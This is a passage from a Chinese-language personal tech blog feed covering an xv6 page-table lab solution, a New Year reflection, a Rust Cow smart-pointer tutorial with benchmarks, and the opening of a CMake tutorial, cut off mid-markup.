class="line">u2kvmcopy(np-&gt;pagetable, np-&gt;kpagetable, <span class="number">0</span>, np-&gt;sz);</span><br><span class="line"></span><br><span class="line"><span class="built_in">release</span>(&amp;np-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pid;</span><br></pre></td></tr></tbody></table></figure><p>对于<code>sbrk</code>，修改<code>growproc</code>:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(n &gt; <span class="number">0</span>){</span><br><span class="line">  <span class="keyword">if</span> (PGROUNDUP(sz + n) &gt;= PLIC)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span>(n &lt; <span class="number">0</span>){</span><br><span class="line">  sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">  <span class="comment">// clean that pte bits</span></span><br><span class="line">}</span><br><span class="line">u2kvmcopy(p-&gt;pagetable, p-&gt;kpagetable, p-&gt;sz, sz);</span><br></pre></td></tr></tbody></table></figure><p>之后，在<code>userinit</code>中，将第一个进程的用户页表复制到内核页表：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">u2kvmcopy(p-&gt;pagetable, p-&gt;kpagetable, <span class="number">0</span>, p-&gt;sz);</span><br><span class="line"></span><br><span class="line"><span class="built_in">release</span>(&amp;p-&gt;lock);</span><br></pre></td></tr></tbody></table></figure><p>最后，将原<code>cpoyin/copyinstr</code>修改为对<code>cpoyin_new/copyinstr_new</code>的调用即可。</p><p>在<code>copyin_new</code>中，做了<code>srcva + len &lt; srcva</code>判断条件。这是为了防止<code>len</code>过大，导致溢出。</p><p>最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/pgtbl">github仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> page table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>告别2020庚子鼠年</title>
      <link href="2021/02/11/gao-bie-2020-geng-zi-shu-nian/"/>
      <url>2021/02/11/gao-bie-2020-geng-zi-shu-nian/</url>
      
        <content type="html"><![CDATA[<p>2020庚子鼠年，在家上了半年网课，慵懒地躺尸，同时又在焦虑感的驱使下战战兢兢地当个做题家。而后，二进宫实习，同时参加夏令营，拿到offer；国庆离职，进入实验室，成为临时工。一直在忙碌，一直在焦虑。  </p><p>「吾之大患，因有吾身」，成长的经历，让我总是被「焦虑」二字困扰。对自己想做的事，隔得很久便开始计划，有一点不顺意便焦虑得不行。人生中并不是很忙的阶段，也因为焦虑变得无端忙碌。好在运气不错，许多目标都实现了，对自己的发展也有了大致的规划。  </p><a id="more"></a><p>告别庚子鼠年，我希望自己能克制焦虑的心境，能静下来，做好自己手上的事，潜心读每一篇论文，像一个工程师一样做项目，学习更多的人生知识。</p><p>最后，新的一年，要<a href="https://github.com/ZhangHanDong/2021soaring.git">牛气冲天</a>。</p><img src="image-20210211222552783.png" alt="image-20210211222552783" style="zoom: 33%;"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 随想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新年 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust智能指针Cow</title>
      <link href="2021/01/30/rust-zhi-neng-zhi-zhen-cow/"/>
      <url>2021/01/30/rust-zhi-neng-zhi-zhen-cow/</url>
      
        <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p><code>Cow</code>是一个提供了写时克隆功能的智能指针，它可以包装对数据的借用，当需要修改数据或者获取数据的所有权时，对数据<code>clone</code>。它的定义如下：</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">enum</span> <span class="title">Cow</span></span>&lt;<span class="symbol">'a</span>, B&gt; </span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    B: <span class="symbol">'a</span> + <span class="built_in">ToOwned</span> + ?<span class="built_in">Sized</span>, </span><br><span class="line"> {</span><br><span class="line">    Borrowed(&amp;<span class="symbol">'a</span> B),</span><br><span class="line">    Owned(&lt;B <span class="keyword">as</span> <span class="built_in">ToOwned</span>&gt;::Owned),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><code>Cow</code>名为<code>clone-on-write</code>，但是对数据类型<code>B</code>的<code>trait</code>要求是<code>ToOwned</code>，而不是<code>Clone</code>。这是因为<code>Clone</code>只能从<code>&amp;T</code>生成<code>T</code>，但是<code>ToOwned</code>泛化为从任意给定类型的借用数据构建新类型的数据。功能更为强大。</li></ul><a id="more"></a><p>如下一段示例代码，将<code>Cow</code>应用在结构体中。</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::borrow::Cow;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Items</span></span>&lt;<span class="symbol">'a</span>, X: <span class="symbol">'a</span>&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    [X]: <span class="built_in">ToOwned</span>&lt;Owned = <span class="built_in">Vec</span>&lt;X&gt;&gt;,</span><br><span class="line">{</span><br><span class="line">    values: Cow&lt;<span class="symbol">'a</span>, [X]&gt;,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;<span class="symbol">'a</span>, X: <span class="built_in">Clone</span> + <span class="symbol">'a</span>&gt; Items&lt;<span class="symbol">'a</span>, X&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    [X]: <span class="built_in">ToOwned</span>&lt;Owned = <span class="built_in">Vec</span>&lt;X&gt;&gt;,</span><br><span class="line">{</span><br><span class="line">    <span class="function"><span class="keyword">fn</span> <span class="title">new</span></span>(v: Cow&lt;<span class="symbol">'a</span>, [X]&gt;) -&gt; <span class="keyword">Self</span> {</span><br><span class="line">        Items { values: v }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creates a container from borrowed values of a slice</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() {</span><br><span class="line">    <span class="keyword">let</span> readonly = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">let</span> borrowed = Items::new((&amp;readonly[..]).into());</span><br><span class="line">    <span class="keyword">match</span> borrowed {</span><br><span class="line">        Items {</span><br><span class="line">            values: Cow::Borrowed(b),</span><br><span class="line">        } =&gt; <span class="built_in">println!</span>(<span class="string">"borrowed {:?}"</span>, b),</span><br><span class="line">        _ =&gt; <span class="built_in">panic!</span>(<span class="string">"expect borrowed value"</span>),</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> clone_on_write = borrowed;</span><br><span class="line">    <span class="comment">// Mutates the data from slice into owned vec and pushes a new value on top</span></span><br><span class="line">    clone_on_write.values.to_mut().push(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"clone_on_write = {:?}"</span>, clone_on_write.values);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The data was mutated. Let check it out.</span></span><br><span class="line">    <span class="keyword">match</span> clone_on_write {</span><br><span class="line">        Items {</span><br><span class="line">            values: Cow::Owned(_),</span><br><span class="line">        } =&gt; <span class="built_in">println!</span>(<span class="string">"clone_on_write contains owned data"</span>),</span><br><span class="line">        _ =&gt; <span class="built_in">panic!</span>(<span class="string">"expect owned data"</span>),</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行生成如下结果，可见对借用的数据进行修改后，发生了克隆。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">borrowed [1, 2]</span><br><span class="line">clone_on_write = [1, 2, 3]</span><br><span class="line">clone_on_write contains owned data</span><br></pre></td></tr></tbody></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>试想这样一个场景，我们需要给处理一些<code>Url</code>，其中一部分是<code>https://</code>开头的，而另一部分不是，现在要给缺少<code>https://</code>前缀的<code>Url</code>加上前缀。</p><p>使用<code>Cow</code>，函数如下：</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">add_prefix_by_cow</span></span>&lt;<span class="symbol">'a</span>, T&gt;(urls: T, prefix: &amp;<span class="built_in">str</span>) -&gt; <span class="built_in">Vec</span>&lt;Cow&lt;<span class="symbol">'a</span>, <span class="built_in">String</span>&gt;&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    T: <span class="built_in">IntoIterator</span>&lt;Item = &amp;<span class="symbol">'a</span> <span class="built_in">String</span>&gt;,</span><br><span class="line">{</span><br><span class="line">    urls.into_iter()</span><br><span class="line">        .map(|url| {</span><br><span class="line">            <span class="keyword">if</span> url.starts_with(prefix) {</span><br><span class="line">                Cow::Borrowed(url)</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                Cow::Owned(<span class="built_in">String</span>::with_capacity(url.len() + prefix.len()) + prefix + url)</span><br><span class="line">            }</span><br><span class="line">        })</span><br><span class="line">        .collect()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>不使用<code>Cow</code>，函数如下：</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">add_prefix_by_clone</span></span>&lt;<span class="symbol">'a</span>, T&gt;(urls: T, prefix: &amp;<span class="symbol">'a</span> <span class="built_in">str</span>) -&gt; <span class="built_in">Vec</span>&lt;<span class="built_in">String</span>&gt;</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    T: <span class="built_in">IntoIterator</span>&lt;Item = &amp;<span class="symbol">'a</span> <span class="built_in">String</span>&gt;,</span><br><span class="line">{</span><br><span class="line">    urls.into_iter()</span><br><span class="line">        .map(|url| {</span><br><span class="line">            <span class="keyword">if</span> url.starts_with(prefix) {</span><br><span class="line">                url.clone()</span><br><span class="line">            } <span class="keyword">else</span> {</span><br><span class="line">                url.clone() + prefix</span><br><span class="line">            }</span><br><span class="line">        })</span><br><span class="line">        .collect()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>用<code>Criterion</code>来进行benchmark测试</p><figure class="highlight rust"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">bench</span></span>(c: &amp;<span class="keyword">mut</span> Criterion) {</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> group = c.benchmark_group(<span class="string">"cow_bench"</span>);</span><br><span class="line">    group.sampling_mode(SamplingMode::Linear);</span><br><span class="line">    group.bench_function(<span class="string">"cow"</span>, |b| {</span><br><span class="line">        b.iter_batched(</span><br><span class="line">            || {</span><br><span class="line">                <span class="keyword">let</span> pre = <span class="built_in">vec!</span>[<span class="string">"https://127.0.0.1"</span>.to_string(); <span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">let</span> non_pre = <span class="built_in">vec!</span>[<span class="string">"127.0.0.1"</span>.to_string(); <span class="number">1024</span>];</span><br><span class="line">                [pre, non_pre].concat()</span><br><span class="line">            },</span><br><span class="line">            |v| {</span><br><span class="line">                <span class="keyword">let</span> _ = add_prefix_by_cow(&amp;v, <span class="string">"https://"</span>);</span><br><span class="line">            },</span><br><span class="line">            BatchSize::SmallInput,</span><br><span class="line">        )</span><br><span class="line">    });</span><br><span class="line">    group.bench_function(<span class="string">"clone"</span>, |b| {</span><br><span class="line">        b.iter_batched(</span><br><span class="line">            || {</span><br><span class="line">                <span class="keyword">let</span> pre = <span class="built_in">vec!</span>[<span class="string">"https://127.0.0.1"</span>.to_string(); <span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">let</span> non_pre = <span class="built_in">vec!</span>[<span class="string">"127.0.0.1"</span>.to_string(); <span class="number">1024</span>];</span><br><span class="line">                [pre, non_pre].concat()</span><br><span class="line">            },</span><br><span class="line">            |v| {</span><br><span class="line">                <span class="keyword">let</span> _ = add_prefix_by_clone(&amp;v, <span class="string">"https://"</span>);</span><br><span class="line">            },</span><br><span class="line">            BatchSize::SmallInput,</span><br><span class="line">        )</span><br><span class="line">    });</span><br><span class="line">    group.finish();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cow_bench/cow           time:   [256.10 us 259.48 us 262.41 us]                          </span><br><span class="line">cow_bench/<span class="built_in">clone</span>         time:   [448.13 us 457.38 us 467.73 us]</span><br></pre></td></tr></tbody></table></figure><p>生成分析图片如下图所示，可见<code>Cow</code>在大量的内存操作时，能尽可能的进行内存共享，延迟耗时的克隆操作，进行更加细致的内存操作控制。</p><p><img src="image-20210131002520961.png" alt="image-20210131002520961"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rust </tag>
            
            <tag> 智能指针 </tag>
            
            <tag> cow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMake Tutorial</title>
      <link href="2020/10/29/cmake-tutorial/"/>
      <url>2020/10/29/cmake-tutorial/</url>
      
        <content type="html"><![CDATA[<p>最近因为毕设的原因，需要看Cpp项目，首先项目构建就涉及到了CMake，所以跟着CMake官网的Tutorial学习了一下，该文章算是官网教程的搬运。<br><a href="https://cmake.org/cmake/help/latest/guide/tutorial/index.html">Tutorial点这里</a>, <a href="https://github.com/Kitware/CMake/tree/master/Help/guide/tutorial">GitHub代码点这里</a>.</p><h1 id="构建简单项目"><a href="#构建简单项目" class="headerlink" title="构建简单项目"></a>构建简单项目</h1><p>最基本的CMake项目是由源代码文件构建可执行文件。对于简单的项目，只需要一个三行的CMakeLists.txt文件。这将是我们tutorial的起点。</p><a id="more"></a><h2 id="开始项目"><a href="#开始项目" class="headerlink" title="开始项目"></a>开始项目</h2><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the project name</span></span><br><span class="line"><span class="keyword">project</span>(Tutorial)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add the executable</span></span><br><span class="line"><span class="keyword">add_executable</span>(Tutorial tutorial.cxx)</span><br></pre></td></tr></tbody></table></figure><p>源代码<code>tutorial.cxx</code>如下</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A simple program that computes the square root of a number</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) {</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Usage: "</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">" number"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// convert input to double</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">double</span> inputValue = atof(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// calculate square root</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">double</span> outputValue = <span class="built_in">sqrt</span>(inputValue);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The square root of "</span> &lt;&lt; inputValue &lt;&lt; <span class="string">" is "</span> &lt;&lt; outputValue</span><br><span class="line">            &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="添加版本号并配置头文件"><a href="#添加版本号并配置头文件" class="headerlink" title="添加版本号并配置头文件"></a>添加版本号并配置头文件</h2><p>添加版本号</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set the project name and version</span></span><br><span class="line"><span class="keyword">project</span>(Tutorial VERSION <span class="number">1.0</span>)</span><br></pre></td></tr></tbody></table></figure><p>然后，配置一个头文件，将版本号传递给源代码</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">configure_file</span>(TutorialConfig.h.in TutorialConfig.h)</span><br></pre></td></tr></tbody></table></figure><p>由于配置的文件将被写入二叉树，所以我们必须将该目录添加到搜索include文件的路径列表中（该声明放在<code>add_executable</code>之后）:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_include_directories</span>(Tutorial PUBLIC</span><br><span class="line">                           <span class="string">"${PROJECT_BINARY_DIR}"</span></span><br><span class="line">                           )</span><br></pre></td></tr></tbody></table></figure><p>新建<code>TutorialConfig.h.in</code></p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// the configured options <span class="keyword">and</span> settings for Tutorial</span><br><span class="line"><span class="comment">#define Tutorial_VERSION_MAJOR @Tutorial_VERSION_MAJOR@</span></span><br><span class="line"><span class="comment">#define Tutorial_VERSION_MINOR @Tutorial_VERSION_MINOR@</span></span><br></pre></td></tr></tbody></table></figure><p>当CMake配置这个头文件时，@Tutorial_VERSION_MAJOR@和@Tutorial_VERSION_MINOR@的值将被替换。</p><p>接着，修改源代码，include 头文件<code>TutorialConfig.h</code>。然后，更新源代码打印出可执行文件的名称和版本号：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) {</span><br><span class="line">   <span class="comment">// report version</span></span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">" Version "</span> &lt;&lt; Tutorial_VERSION_MAJOR &lt;&lt; <span class="string">"."</span></span><br><span class="line">             &lt;&lt; Tutorial_VERSION_MINOR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Usage: "</span> &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; <span class="string">" number"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>指定使用C++11标准，使用<code>std::stod</code></p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the project name and version</span></span><br><span class="line"><span class="keyword">project</span>(Tutorial VERSION <span class="number">1.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># specify the C++ standard</span></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD_REQUIRED <span class="keyword">True</span>)</span><br></pre></td></tr></tbody></table></figure><p>CMAKE_CXX_STANDARD生命必须放在add_executable之前</p><h2 id="构建并测试"><a href="#构建并测试" class="headerlink" title="构建并测试"></a>构建并测试</h2><p>首先构建</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir step1_build</span><br><span class="line"><span class="built_in">cd</span> step1_build</span><br><span class="line">cmake ..</span><br><span class="line">cmake --build .</span><br></pre></td></tr></tbody></table></figure><p>然后测试</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tutorial 4294967296</span><br><span class="line">Tutorial 10</span><br><span class="line">Tutorial</span><br></pre></td></tr></tbody></table></figure><h1 id="添加一个库"><a href="#添加一个库" class="headerlink" title="添加一个库"></a>添加一个库</h1><p>我们将向项目中添加一个库。这个库将包含了自定义的平方根函数的实现。之后，在可执行文件中使用用这个库，替换编译器提供的标准平方根函数。</p><p>新建<code>MathFunctions</code>目录，在其下添加<code>CMakeLists.txt</code>,添加如下内容:</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(MathFunctions mysqrt.cxx)</span><br></pre></td></tr></tbody></table></figure><p><code>mysqrt.cxx</code>如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a hack square root calculation using simple operations</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">double</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (x &lt;= <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> result = x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// do ten iterations</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">        <span class="keyword">if</span> (result &lt;= <span class="number">0</span>) {</span><br><span class="line">            result = <span class="number">0.1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">double</span> delta = x - (result * result);</span><br><span class="line">        result = result + <span class="number">0.5</span> * delta / result;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Computing sqrt of "</span> &lt;&lt; x &lt;&lt; <span class="string">" to be "</span> &lt;&lt; result</span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为了使用新库，我们将在顶层的<code>CMakeLists.txt</code>文件中添加一个<code>add subdirectory()</code>调用，以便构建库。我们将新库添加到可执行文件中，并将<code>MathFunctions</code>添加为include目录，以便可以找到<code>mqsqrt.h</code>头文件。顶层的<code>CMakeLists.txt</code>文件的最后几行现在看起来应该是这样的：</p><figure class="highlight 